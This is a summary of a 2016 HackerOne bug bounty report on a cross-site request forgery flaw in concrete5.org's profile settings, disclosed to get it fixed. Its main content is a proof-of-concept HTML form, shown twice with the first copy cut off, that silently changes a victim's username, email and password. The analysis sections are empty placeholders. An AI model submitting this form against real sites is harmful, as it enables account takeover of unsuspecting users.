# CSRF Full Account Takeover

## Metadata
- **Source:** HackerOne
- **Report:** 152052 | https://hackerone.com/reports/152052
- **Submitted:** 2016-07-18
- **Reporter:** khalidamin
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Try this code in your browser:

<html>
  <body>
    <form action="https://www.concrete5.org/profile/preferences/-/save/" method="POST">
      <input type="hidden" name="uName" value="██████" />
      <input type="hidden" name="uEmail" value="████" />
      <input type="hidden" name="uAccountType" value="owner" />
      <input type="hidden" name="profile&#95;private&#95;messages&#95;notification&#9

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Try this code in your browser:

<html>
  <body>
    <form action="https://www.concrete5.org/profile/preferences/-/save/" method="POST">
      <input type="hidden" name="uName" value="██████" />
      <input type="hidden" name="uEmail" value="████" />
      <input type="hidden" name="uAccountType" value="owner" />
      <input type="hidden" name="profile&#95;private&#95;messages&#95;notification&#95;enabled" value="1" />
      <input type="hidden" name="uPasswordOld" value="" />
      <input type="hidden" name="uPasswordNew" value="" />
      <input type="hidden" name="uPasswordNewConfirm" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

You need to ask for confirming password for changing settings, or use a token everytime it is changed.

If any further information is needed, plase ask.

Thanks.


</details>

---
*Analysed by Claude on 2026-05-24*
